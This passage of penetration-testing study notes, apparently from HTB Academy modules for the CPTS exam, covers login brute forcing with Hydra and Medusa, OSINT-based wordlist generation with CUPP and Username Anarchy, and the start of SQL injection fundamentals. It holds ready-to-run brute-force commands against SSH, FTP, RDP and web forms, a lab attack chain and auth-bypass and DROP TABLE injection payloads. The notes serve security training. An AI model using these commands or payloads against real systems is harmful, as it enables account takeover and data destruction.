-f Stop after first successful login found hydra -f ...
-s PORT Specify non-default port hydra -s 2222 ...
-v / -V Verbose / very verbose output hydra -V ...
service://server Target service and address hydra ssh://192.168.1.100
/OPT Service-specific options See examples below
-M FILE File with list of target servers hydra -l root -p toor -M targets.txt ssh
-x MIN:MAX:CHARSET Brute force mode — generate passwords hydra -x 6:8:abc...

Supported Services

Service Protocol Example Command
ftp File Transfer Protocol hydra -l admin -P passwords.txt ftp://192.168.1.100
ssh Secure Shell hydra -l root -P passwords.txt ssh://192.168.1.100
http-get HTTP Basic Auth (GET) hydra -l admin -P passwords.txt www.example.com http-get
http-post-form HTTP Login Form (POST) hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
smtp Email sending hydra -l admin -P passwords.txt smtp://mail.server.com
pop3 Email retrieval hydra -l user@mail.com -P passwords.txt pop3://mail.server.com
imap Email access hydra -l user@mail.com -P passwords.txt imap://mail.server.com
mysql MySQL Database hydra -l root -P passwords.txt mysql://192.168.1.100
mssql Microsoft SQL Server hydra -l sa -P passwords.txt mssql://192.168.1.100
vnc Virtual Network Computing hydra -P passwords.txt vnc://192.168.1.100
rdp Remote Desktop Protocol hydra -l admin -P passwords.txt rdp://192.168.1.100

Hydra Example 1 — Basic HTTP Authentication

What is Basic HTTP Auth?

When a server requires Basic Auth, the browser prompts for credentials. The username and password are combined (username:password), Base64-encoded, and sent in the Authorization header:

GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz

⚠️ Base64 is not encryption — it's trivially reversible. Basic Auth over HTTP (not HTTPS) sends credentials in cleartext effectively.

Attacking Basic Auth with Hydra

First, download the wordlist:

curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt

Then run Hydra:

hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81

Breaking down the command:

Part Meaning
-l basic-auth-user The username we already know is basic-auth-user
-P 2023-200_most_used_passwords.txt Use this password list to brute-force
127.0.0.1 Target IP (localhost in this lab)
http-get Use HTTP GET requests (Basic Auth uses GET)
/ Target the root path /
-s 81 Override default port — target is on port 81
🔍 What you're looking for Hydra will return the valid password. Use that password to log in and retrieve the flag.

Hydra Example 2 — Web Login Form (http-post-form)

Understanding Login Forms

Most custom login forms use HTML POST requests:

<form method="POST">
  <input type="text" id="username" name="username">
  <input type="password" id="password" name="password">
  <input type="submit" value="Login">
</form>

The POST request looks like:

POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded

username=john&password=secret123

Finding the Parameters — Manual Inspection

  1. Open the login page in your browser
  2. Right-click → Inspect → view the HTML source
  3. Note the name attributes of the input fields (these become the POST parameters)
  4. Press F12 → Network tab → submit a test login → inspect the POST request to confirm field names and the error message shown on failure

The http-post-form Syntax

hydra [options] target http-post-form "path:params:condition_string"

The condition string tells Hydra how to detect success vs. failure:

Condition Meaning Example
F=text Failure — if this text appears, login failed F=Invalid credentials
S=302 Success — if HTTP 302 redirect occurs, login succeeded S=302
S=text Success — if this text appears, login succeeded S=Dashboard

Tip: Failure conditions (F=) are easier and more common because error messages are predictable.

Full Attack Command

First, download the wordlists:

curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt

Then run Hydra:

hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

Breaking down the command:

Part Meaning
-L top-usernames-shortlist.txt Try all usernames from this file
-P 2023-200_most_used_passwords.txt Try all passwords from this file
-f Stop as soon as the first valid login is found
IP Target IP address
-s 5000 Target is on port 5000
http-post-form Module for web login forms using POST
"/:username=^USER^&password=^PASS^:F=Invalid credentials" Path /, params with placeholders, fail if "Invalid credentials" appears

What to do with results: Log in to the site with the found credentials, retrieve the flag.

Hydra Example 3 — SSH on Multiple Servers

hydra -l root -p toor -M targets.txt ssh
  • -l root — username is root
  • -p toor — password is toor (common default for root)
  • -M targets.txt — list of target IPs, one per line
  • ssh — use the SSH module

Hydra attacks all servers in parallel. Useful for scanning a subnet after discovering multiple potentially vulnerable hosts.

Hydra Example 4 — FTP on Non-Standard Port

hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
  • -s 2121 — target is using port 2121 instead of the default FTP port 21
  • -V — very verbose, shows each attempt (useful for debugging)

Hydra Example 5 — Advanced RDP Brute Force (Password Generation)

hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
  • -x 6:8:... — generate all passwords between 6 and 8 characters using the specified character set
  • This is true brute force mode — no wordlist needed; Hydra generates candidates on the fly
  • Use this when you know the approximate password length/complexity but don't have a wordlist match

Tool - Medusa

Medusa is a fast, massively parallel, modular login brute-forcer. Similar to Hydra but with a different architecture. Both are standard tools in a penetration tester's toolkit.

Key Features

  • Massively parallel — runs many threads simultaneously
  • Modular design — each service has its own module
  • Supports many remote authentication protocols

Installation

# Check if installed
medusa -h

# Install if missing
sudo apt-get -y update
sudo apt-get -y install medusa

Basic Syntax

medusa [target_options] [credential_options] -M module [module_options]

Parameter Reference

Parameter Explanation Example
-h HOST Single target hostname/IP medusa -h 192.168.1.10 ...
-H FILE File with list of targets medusa -H targets.txt ...
-u USERNAME Single username medusa -u admin ...
-U FILE File with list of usernames medusa -U usernames.txt ...
-p PASSWORD Single password medusa -p password123 ...
-P FILE File with list of passwords medusa -P passwords.txt ...
-M MODULE Module to use medusa -M ssh ...
-m "OPTIONS" Additional module options See examples below
-t TASKS Number of parallel login attempts medusa -t 4 ...
-f Stop after first success on current host medusa -f ...
-F Stop after first success on any host medusa -F ...
-n PORT Non-default port medusa -n 2222 ...
-v LEVEL Verbose level (up to 6) medusa -v 4 ...
-e ns Extra checks: n=empty password, s=password=username medusa -e ns ...

Supported Modules

Module Protocol Example
ssh Secure Shell medusa -M ssh -h 192.168.1.100 -u admin -P passwords.txt
ftp File Transfer Protocol medusa -M ftp -h 192.168.1.100 -U users.txt -P passwords.txt
http HTTP (Basic Auth) medusa -M http -h www.example.com -U users.txt -P passwords.txt -m GET
imap Email access medusa -M imap -h mail.example.com -U users.txt -P passwords.txt
mysql MySQL Database medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt
pop3 Email retrieval medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt
rdp Remote Desktop medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt
ssh (stop on first) SSH + fast mode medusa -M ssh -h 192.168.1.100 -u admin -P passwords.txt -f
svn Subversion medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt
telnet Telnet medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt
vnc Virtual Network Computing medusa -M vnc -h 192.168.1.100 -P passwords.txt
web-form Web Login Forms medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^"

Medusa Practical — SSH + FTP Attack Chain

Scenario

You've been given a target machine. You know the SSH username is sshuser. Goal: crack SSH, get in, find more services, crack those too.

Step 1 — Crack SSH with Medusa

medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3

Breaking down the command:

Part Meaning
-h <IP> Target IP address
-n <PORT> SSH port (usually 22, but check your lab)
-u sshuser We already know the username
-P 2023-200_most_used_passwords.txt Password list to try
-M ssh Use the SSH module
-t 3 3 parallel login attempts — fast but less likely to trigger lockouts
🔍 What you're looking for
ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]

Step 2 — Connect via SSH

ssh sshuser@<IP> -p PORT
# Enter the found password when prompted

You now have a shell on the target machine.

Step 3 — Enumerate Open Ports (from inside the machine)

netstat -tulpn | grep LISTEN

Why? You're looking for other services running on the machine that aren't exposed externally. Internal services like FTP often run on localhost only.

What you might see:

tcp6   0   0 :::22   :::*   LISTEN
tcp6   0   0 :::21   :::*   LISTEN

Port 21 = FTP running internally.

Step 4 — Confirm with Nmap (local scan)

nmap localhost
🔍 What you're looking for Confirm the FTP service and any other open ports not visible from outside.

Step 5 — Find the FTP Username

ls /home
# Output: sshuser  ftpuser

The /home/ftpuser directory exists — strongly implies the FTP username is ftpuser.

Step 6 — Crack FTP with Medusa

medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5

Key differences from the SSH command:

Part Meaning
-h 127.0.0.1 Target is localhost (FTP only listens internally); IPv4 explicit
-u ftpuser Username inferred from /home directory
-M ftp Switch to FTP module
-t 5 Increase threads — FTP is faster than SSH
🔍 What you're looking for
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: [password] [SUCCESS]

Step 7 — Connect to FTP and Get the Flag

ftp ftp://ftpuser:<FOUND_PASSWORD>@localhost

Inside FTP:

ftp> ls
# Shows flag.txt

ftp> get flag.txt
# Downloads the file

ftp> exit

Read the flag:

cat flag.txt
# HTB{...}

Medusa Other Examples

Test Empty/Default Passwords

medusa -h 10.0.0.5 -U usernames.txt -e ns -M ssh
  • -e n — try empty password for each username
  • -e s — try password = username (e.g., username admin, password admin)
  • Combined: -e ns — do both checks

Why? Many misconfigured services have accounts with no password or the username as password.

Attack Multiple Web Servers (Basic HTTP Auth)

medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
  • -H web_servers.txt — list of target IPs/hostnames
  • -m GET — use HTTP GET for Basic Auth check
  • Medusa attacks all servers concurrently

Custom Wordlists

Generic wordlists cast a wide net. Custom wordlists are laser-focused on your specific target — dramatically improving success rates.

Tool — Username Anarchy

Generates possible username combinations from a real person's name.

🔗 GitHub: https://github.com/urbanadventurer/username-anarchy

Installation

sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy

Why Use It?

For a target named "Jane Smith", obvious guesses like janesmith barely scratch the surface. Usernames could be janemarie, smithj87, j.smith, J.S., jane_smith, and hundreds of variations. Username Anarchy generates all of them systematically.

Basic Usage

./username-anarchy Jane Smith > jane_smith_usernames.txt

What it generates:
- jane, smith, janesmith, smithjane
- jane.smith, j.smith, j.s.
- janesmith (first 8 chars), janes, sj, kanna
- JaneSmith, Jane.Smith, AnnaKey (format variants)
- And many more

Available Commands

Command Description
./username-anarchy Jane Smith Generate usernames for "Jane Smith"
./username-anarchy -i names.txt Read names from a file (space/CSV/TAB delimited)
./username-anarchy -a --country us Auto-generate from common US names dataset
./username-anarchy -l List all available username format plugins
./username-anarchy -f format1,format2 Use specific format plugins only
./username-anarchy -@ example.com Append @example.com to each username (for email lists)
./username-anarchy --case-insensitive Output all lowercase

Tool — CUPP (Common User Passwords Profiler)

CUPP creates highly personalized password wordlists based on intelligence gathered about your target. It leverages human tendencies — using personal info like names, birthdays, and pet names as passwords.

🔗 GitHub: https://github.com/Mebus/cupp

Installation

sudo apt install cupp -y

Where to Get Intelligence for CUPP

  • Social media — Facebook, Instagram, Twitter, LinkedIn: birthdays, relationships, pet names, hobbies, favorite quotes
  • Company websites — current role, bio, professional history
  • Public records — addresses, family members
  • News articles / blogs — interests, achievements, affiliations

Example — Profiling Jane Smith

Assume you've gathered this from OSINT:

Field Details
Name Jane Smith
Nickname Janey
Birthdate December 11, 1990
Partner Jim (nickname: Jimbo)
Partner DOB December 12, 1990
Pet Spot
Company AHI
Interests Hackers, Pizza, Golf, Horses
Favorite Colors Blue

Running CUPP in Interactive Mode

cupp -i

Enter the information as prompted. CUPP will generate:

[+] Saving dictionary to jane.txt, counting 46790 words.

What CUPP Generates

Mutation Type Examples
Original + Capitalized jane, Jane
Reversed enaj, enaJ
Birthdate Variations jane1990, smith1211
Concatenations janesmith, smithjane
Special Char Appended jane!, smith@
Numbers Appended jane123, smith2024
Leetspeak j4n3, 5m1th
Combined Jane1990!, smith1211@

Other CUPP Commands

Command Description
cupp -i Interactive mode — walks you through questions
cupp -w profiles.txt Generate from a predefined profile file
cupp -l Download popular lists like rockyou.txt

Password Policy Filtering with grep

Once you have a wordlist (e.g., CUPP-generated), you need to filter it to match the target organization's password policy. Sending passwords that don't meet the policy wastes time — they'll be rejected before even being checked.

Policy Filtering Reference Table

Requirement Grep Pattern Explanation
Min 8 chars grep -E '^.{8,}$' ^.{8,}$ matches lines with 8+ characters
At least 1 uppercase grep -E '[A-Z]' [A-Z] matches any uppercase letter
At least 1 lowercase grep -E '[a-z]' [a-z] matches any lowercase letter
At least 1 digit grep -E '[0-9]' [0-9] matches any digit
At least 1 special char grep -E '[!@#$%^&*()_+\-=\[\]{};:\\|,.<>/?]' Character class of common symbols
At least 2 special chars grep -E '([!@#$%^&*].*){2,}' 2+ occurrences of special chars from the set
No consecutive repeated chars grep -v -E '(.)\1' -v inverts — excludes lines with aa, 11, etc.
Exclude "password" grep -v -i 'password' -v inverts, -i case-insensitive
Exclude dict words grep -v -f dictionary.txt -f reads exclusion patterns from a file

Full Filter Chain Example

Suppose the target policy requires:
- Minimum 6 characters
- At least one uppercase
- At least one lowercase
- At least one number
- At least two special characters from !@#$%^&*

# Apply all filters in a pipeline
grep -E '^.{6,}$' jane.txt | \
grep -E '[A-Z]' | \
grep -E '[a-z]' | \
grep -E '[0-9]' | \
grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt

Each | (pipe) passes results to the next filter. Only passwords satisfying all conditions make it to jane-filtered.txt.

Result: From ~46,000 CUPP-generated passwords → ~7,900 policy-compliant candidates.

Putting It All Together — Custom Wordlist + Hydra

hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form \
"/:username=^USER^&password=^PASS^:Invalid credentials"

This sends only policy-compliant, target-relevant passwords. Far more efficient than generic wordlists.

Quick Reference Cheatsheet

Hydra Commands

# Basic HTTP Auth
hydra -l admin -P passwords.txt www.example.com http-get

# Web Login Form
hydra -L users.txt -P passwords.txt -f IP -s PORT http-post-form \
"/:username=^USER^&password=^PASS^:F=Invalid credentials"

# Success condition (redirect)
hydra -l admin -P passwords.txt www.example.com http-post-form \
"/login:user=^USER^&pass=^PASS^:S=302"

# SSH
hydra -l root -P passwords.txt ssh://192.168.1.100

# Multiple SSH targets
hydra -l root -p toor -M targets.txt ssh

# FTP on non-standard port
hydra -L users.txt -P passwords.txt -s 2121 -V ftp.example.com ftp

# RDP with password generation
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp

# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.100

Medusa Commands

# SSH
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# SSH multiple targets
medusa -H targets.txt -U users.txt -P passwords.txt -M ssh

# FTP with threads
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp -t 5

# HTTP Basic Auth
medusa -H web_servers.txt -U users.txt -P passwords.txt -M http -m GET

# Empty/default password checks
medusa -h 10.0.0.5 -U usernames.txt -e ns -M ssh

# Stop on first find
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f

# RDP
medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp

Wordlist Locations (SecLists)

# Download SecLists (if not installed)
git clone https://github.com/danielmiessler/SecLists.git

# Common locations on Kali/Parrot
/usr/share/seclists/Passwords/rockyou.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Passwords/2023-200_most_used_passwords.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt

Policy Filtering (grep)

# Min 8 chars
grep -E '^.{8,}$' wordlist.txt

# Has uppercase
grep -E '[A-Z]' wordlist.txt

# Has lowercase
grep -E '[a-z]' wordlist.txt

# Has digit
grep -E '[0-9]' wordlist.txt

# Has special char
grep -E '[!@#$%^&*]' wordlist.txt

# Full chain (all requirements)
grep -E '^.{8,}$' wordlist.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '[!@#$%^&*]' > filtered.txt

# Count results
wc -l filtered.txt

Username Anarchy

git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy Jane Smith > usernames.txt
./username-anarchy -l                         # list plugins
./username-anarchy -@ company.com Jane Smith  # email format

CUPP

cupp -i          # interactive mode (enter target info)
cupp -l          # download wordlists
cupp -w profiles.txt  # from profile file

Key Takeaways for the CPTS Exam

📌 Hydra → versatile, parallel, great for web forms and network services
📌 Medusa → similar to Hydra, modular, good for SSH/FTP chains
📌 Dictionary > Brute Force in most real-world scenarios — wordlists are fast; pure brute force is slow
📌 Hybrid attacks target the predictable habit of minor password modifications
📌 Default credentials are low-hanging fruit — always try them first
📌 Filter wordlists to match the target's password policy before attacking
📌 Custom wordlists (Username Anarchy + CUPP) are more effective than generic ones against specific targets
📌 Credential stuffing exploits password reuse — check breached lists against multiple services
📌 After cracking SSH, pivot internally — enumerate with netstat/nmap and find other services

Notes based on HTB Academy — Login Brute Forcing module (Module 16)
Tools: Hydra, Medusa, Username Anarchy, CUPP, SecLists, grep

Web Applications/Module 17

SQL Injection Fundamentals

Introduction

Most modern web applications use a back-end database to store and retrieve data — everything from page content to user credentials. The web app queries this database in real-time as HTTP(S) requests arrive.

When user-supplied input is used to construct those queries without proper sanitization, an attacker can manipulate the query to do something unintended — this is SQL Injection (SQLi).

[User] → [Client App] → [Application Server] → [DBMS]
                    ←────────────────────────────

Why it matters: SQLi can expose sensitive data, bypass authentication, read/write server files, and even give full remote code execution.

What is SQL Injection (SQLi)?

SQL Injection occurs when malicious input changes the intended SQL query sent to the database.

How it works:
1. Attacker injects a special character (like ' or ") to break out of the intended input context
2. Attacker adds SQL code that modifies or appends to the original query
3. The database executes the attacker-controlled query

Example scenario (PHP):

$searchInput = $_POST['findUser'];
$query = "SELECT * FROM logins WHERE username LIKE '%$searchInput'";

If you input admin, the query becomes:

SELECT * FROM logins WHERE username LIKE '%admin'

If you input 1'; DROP TABLE users; --, the query becomes:

SELECT * FROM logins WHERE username LIKE '%1'; DROP TABLE users; --'

The DROP TABLE now executes! (Note: stacked queries work in MSSQL/PostgreSQL; MySQL uses UNION-based techniques — covered later.)

Impact of SQLi:
- Retrieve sensitive/secret data (passwords, credit cards)
- Bypass authentication (login without credentials)
- Access locked features (admin panels)
- Read and write files on the back-end server
- Gain remote code execution → full server takeover

Intro to Databases

Before exploiting SQLi, you need to understand how databases work.

Web applications use back-end databases to store:
- Web content (images, posts, pages)
- User data (usernames, passwords)
- Application state

Historically, file-based databases were used, but they became slow at scale. This led to Database Management Systems (DBMS).

Database Management Systems (DBMS)

A DBMS helps create, define, host, and manage databases. Interaction happens via CLI tools, GUI apps, or APIs.

Feature Description
Concurrency Multiple users interact simultaneously without data corruption
Consistency Data stays valid across all concurrent interactions
Security Fine-grained user auth and permissions — prevents unauthorized access
Reliability Easy backup and rollback on data loss or breach
SQL Intuitive query language for interacting with data

Two-tier architecture:
- Tier I — Client-side: websites, GUI apps → sends requests via API calls
- Tier II — Middleware: interprets events, uses libraries/drivers to talk to the DBMS
- DBMS — Receives queries, performs INSERT/SELECT/DELETE/UPDATE, returns results or errors

Large-scale databases are usually hosted on separate servers from the app for performance and scalability.

Types of Databases

Relational Databases

The most common type. Uses a schema (template) to define the structure. Tables are linked via keys.

  • Only relational DBs use SQL
  • Examples: MySQL, PostgreSQL, SQL Server, Oracle, Microsoft Access

Example — users table linked to posts table:

users
id username first_name last_name
1 admin admin admin
2 test test test
posts
id user_id date content
1 2 01-01-2021 Welcome...
2 1 02-01-2021 Reminder...

The user_id in posts links to id in users — this relationship is called a Schema.

This makes it fast to retrieve all data about a user across multiple tables with a single query.

Non-Relational Databases (NoSQL)

Does not use tables, rows, or schemas. Stores data using various models depending on the data type. Very scalable and flexible for unstructured data.

Four common NoSQL storage models:
- Key-Value — stores data in JSON/XML with a key per entry (e.g., Redis)
- Document-Based — stores documents (e.g., MongoDB)
- Wide-Column — e.g., Cassandra
- Graph — e.g., Neo4j

Most common NoSQL DB: MongoDB

NoSQL injections exist but are different from SQLi. They are covered in a separate module.

Intro to MySQL

This module focuses on MySQL/MariaDB syntax. SQL can be used to:
- Retrieve data
- Update data
- Delete data
- Create new tables and databases
- Add/remove users and assign permissions

Connecting via Command Line

Tool: mysql — the standard CLI utility to authenticate and interact with MySQL/MariaDB.

mysql -u root -p
  • -u root → username is root
  • -p → prompts for password (don't pass it inline — it gets stored in ~/.bash_history)
# If you must pass password inline (avoid in production):
mysql -u root -pPASSWORD
# Note: NO space between -p and the password

Connecting to a remote host:

mysql -u root -h docker.hackthebox.eu -P 3306 -p
  • -h → remote host
  • -P 3306 → port (uppercase P for port, lowercase p for password)
  • Default MySQL/MariaDB port: 3306

Why: You use this to access a target database directly, or from your PwnBox during HTB labs.

Creating a Database

CREATE DATABASE users;

Why: Sets up a new database. During a pentest, you'll use this understanding to know what databases already exist on the target.

SHOW DATABASES;

Why: Lists all databases on the server — during enumeration, you look for non-default databases that may contain sensitive data.

Default databases you can ignore (always present on any MySQL server):
- information_schema
- mysql
- performance_schema
- sys

USE users;

Why: Switches your active context to the users database so subsequent queries run against it.

Note: SQL statements are case-insensitive (USE = use), but database names are case-sensitive (users ≠ USERS). Convention: write SQL keywords in UPPERCASE.

Tables

DBMS stores data in tables — rows (records) and columns (fields). Each column has a specific data type.

Common data types: INT, VARCHAR(n), DATETIME, DATE, TEXT, BOOLEAN

Create a table:

CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
);

Why: Defines structure. VARCHAR(100) = string up to 100 chars. Inputting more causes an error. During SQLi, knowing column data types helps craft valid UNION payloads.

Table Properties (important constraints):

CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
);
Keyword Meaning
NOT NULL Column cannot be empty (required field)
AUTO_INCREMENT id auto-increases by 1 on each new record
UNIQUE No duplicate values allowed in this column
DEFAULT NOW() Automatically inserts current timestamp
PRIMARY KEY Uniquely identifies each record; used to link tables

List tables:

SHOW TABLES;

Inspect table structure:

DESCRIBE logins;

Why: Shows all columns and their data types — essential when crafting UNION injections where data types must match.

SQL Statements

INSERT — Adding Records

-- Insert into all columns (must match every column in order):
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');

-- Insert into specific columns only (skipping id and date, which have defaults):
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');

-- Insert multiple records at once:
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');

Note: Skipping a NOT NULL column without a DEFAULT causes an error.
Security note: Never store plaintext passwords — always hash them (bcrypt, SHA-256, etc.)

SELECT — Retrieving Data

-- Get all columns from all records:
SELECT * FROM logins;

-- Get only specific columns:
SELECT username, password FROM logins;
  • * = wildcard (all columns)
  • FROM = specifies the table

Why: This is the core of SQLi data extraction. Every piece of data you pull via injection uses SELECT.

DROP — Deleting Tables

DROP TABLE logins;

⚠️ Permanent and immediate — no confirmation prompt. Use with extreme caution.

ALTER — Modifying Table Structure

-- Add a new column:
ALTER TABLE logins ADD newColumn INT;

-- Rename a column:
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;

-- Change a column's data type:
ALTER TABLE logins MODIFY oldColumn DATE;

-- Delete a column:
ALTER TABLE logins DROP oldColumn;

UPDATE — Modifying Records

UPDATE logins SET password = 'change_password' WHERE id > 1;
  • SET → specifies which column(s) to change and to what value
  • WHERE → condition to filter which rows get updated

⚠️ Without WHERE, all rows get updated.

Result — only rows with id > 1 had their password changed:

| 1 | admin         | p@ssw0rd        | (unchanged) |
| 2 | administrator | change_password | (changed)   |
| 3 | john          | change_password | (changed)   |
| 4 | tom           | change_password | (changed)   |

Query Results — Filtering & Sorting

ORDER BY — Sorting

-- Sort ascending (default):
SELECT * FROM logins ORDER BY password;

-- Sort descending:
SELECT * FROM logins ORDER BY password DESC;

-- Sort by multiple columns (secondary sort for ties):
SELECT * FROM logins ORDER BY password DESC, id ASC;

Why: During SQLi, you may ORDER BY column number to detect how many columns exist (covered in Union Injection section).

LIMIT — Restricting Output

-- First 2 results only:
SELECT * FROM logins LIMIT 2;

-- Skip 1, then return 2 results (offset, count):
SELECT * FROM logins LIMIT 1, 2;

Note: Offset 1 means start from the 2nd record (0-indexed). Returns 2 records from that point.

WHERE — Filtering Records

-- Numeric condition:
SELECT * FROM logins WHERE id > 1;

-- String match (use single or double quotes for strings):
SELECT * FROM logins WHERE username = 'admin';

Why: WHERE is the clause SQLi targets most often — attackers inject into WHERE conditions to bypass logic.

LIKE — Pattern Matching

-- Match anything starting with 'admin':
SELECT * FROM logins WHERE username LIKE 'admin%';

-- Match exactly 3-character usernames:
SELECT * FROM logins WHERE username LIKE '___';
  • % = wildcard for zero or more characters
  • _ = wildcard for exactly one character

SQL Operators

AND Operator

Both conditions must be TRUE.

SELECT 1 = 1 AND 'test' = 'test';  -- Returns 1 (true)
SELECT 1 = 1 AND 'test' = 'abc';   -- Returns 0 (false)

OR Operator

At least one condition must be TRUE.

SELECT 1 = 1 OR 'test' = 'abc';   -- Returns 1 (true)
SELECT 1 = 2 OR 'test' = 'abc';   -- Returns 0 (false)

NOT Operator

Inverts the boolean result.

SELECT NOT 1 = 1;   -- Returns 0 (false, because 1=1 is true)
SELECT NOT 1 = 2;   -- Returns 1 (true, because 1=2 is false)

Symbol Equivalents

Word Symbol
AND &&
OR \|\|
NOT !

Operator Precedence (high to low)

Priority Operators
1st Division /, Multiplication *, Modulus %
2nd Addition +, Subtraction -
3rd Comparison =, >, <, <=, >=, !=, LIKE
4th NOT !
5th AND &&
6th OR \|\|

Why this matters for SQLi: When crafting OR-based auth bypass payloads, AND evaluates before OR. This means username=X AND password=Y OR 1=1 — AND runs first, giving false AND false = false, then false OR true = true. The injection works.

Practical example:

SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
-- Evaluates as: WHERE username != 'tom' AND id > 1
-- Subtraction runs first, then comparison, then AND

Types of SQL Injections

SQL Injections
├── In-band (output visible on page)
│   ├── Union Based — specify column to read output
│   └── Error Based — force SQL errors that leak data
├── Blind (no visible output)
│   ├── Boolean Based — true/false page responses reveal data char-by-char
│   └── Time Based — delays (SLEEP) indicate true conditions
└── Out-of-band — redirect output to DNS record / external server

This module focuses on Union Based injection.

Subverting Query Logic — Auth Bypass

The Target Login Query

A typical login form runs:

SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';

If a matching record is returned → login succeeds.

🎯 Goal Log in as admin without knowing the password.

Step 1 — SQLi Discovery

Before exploiting, confirm the input is vulnerable. Test these payloads in the username or password field:

Payload URL Encoded What to look for
' %27 SQL syntax error → field is injectable
" %22 SQL syntax error
# %23 Changes query behavior
; %3B May allow stacked queries
) %29 Breaks parenthesized queries

Test: Enter ' as username.

If you see a SQL error like:

You have an error in your SQL syntax near ''' at line 1

→ The field is injectable. The single quote broke out of the string context.

The broken query was:

SELECT * FROM logins WHERE username=''' AND password = 'something';

Three quotes = syntax error. ✅ Confirmed vulnerable.

OR Injection — Bypass with Always-True Condition

Payload for username field:

admin' or '1'='1

Resulting query:

SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';

How it evaluates (operator precedence — AND before OR):
1. '1'='1' AND password='something' → TRUE AND FALSE → FALSE
2. username='admin' OR FALSE → TRUE OR FALSE → TRUE

Result: Returns the admin record → login succeeds.

If you don't know the username at all — inject both fields:
- Username: ' or '1'='1
- Password: something' or '1'='1

Final query:

SELECT * FROM logins WHERE username='' or '1'='1' AND password = 'something' or '1'='1';

This returns TRUE regardless → logs in as the first user in the table.

Or simply use:
- Username: ' or '1' = '1
- Password: (anything)

➜ Next step Now that you're in, explore the application or move to Union-based injection to extract data.

Using Comments

SQL comments let you ignore the rest of the original query after your injection point.

MySQL Comment Syntax

Comment Style Usage
-- - Line comment (note: requires a space after --, adding a trailing - makes this clear)
# Line comment
/**/ Inline comment (rarely used in SQLi)

Important: In MySQL, -- alone is not enough. There must be a space after it: -- (or --+ in URLs, or -- - for clarity).

Example — # comment:

SELECT * FROM logins WHERE username = 'admin'; # anything here is ignored
-- Returns: admin record only, ignores the rest

In URLs: # is treated as a fragment identifier by browsers and not sent to the server. Use %23 (URL-encoded #) instead.

Auth Bypass with Comments

Payload:

admin'-- -

Resulting query:

SELECT * FROM logins WHERE username='admin'-- -' AND password = 'something';

Everything after -- is a comment → the password check is completely ignored.

→ Login succeeds as admin without any password.

Advanced Example — Parenthesis Bypass

Some queries add extra conditions with parentheses:

SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password = 'HASH';

This prevents admin login (id=1) AND uses hashed passwords (can't inject through password field).

Failed attempt: admin'-- -

SELECT * FROM logins WHERE (username='admin'-- -' AND id > 1) AND password = 'HASH';

→ Syntax error: unbalanced parenthesis.

Fix — close the parenthesis in the payload:

admin')-- -

Resulting query:

SELECT * FROM logins WHERE (username='admin')-- -' AND id > 1) AND password = 'HASH';

→ Only checks username='admin' → login succeeds.

➜ What to do next Once auth is bypassed, you're inside the application. Now move to Union injection to extract data from the database.

Union Clause

The UNION operator combines results from multiple SELECT statements into one output.

SELECT * FROM ports UNION SELECT * FROM ships;

Returns all rows from both tables in one result.

Critical rule: Both SELECT statements must return the same number of columns, and data types must be compatible.

-- This fails — different column counts:
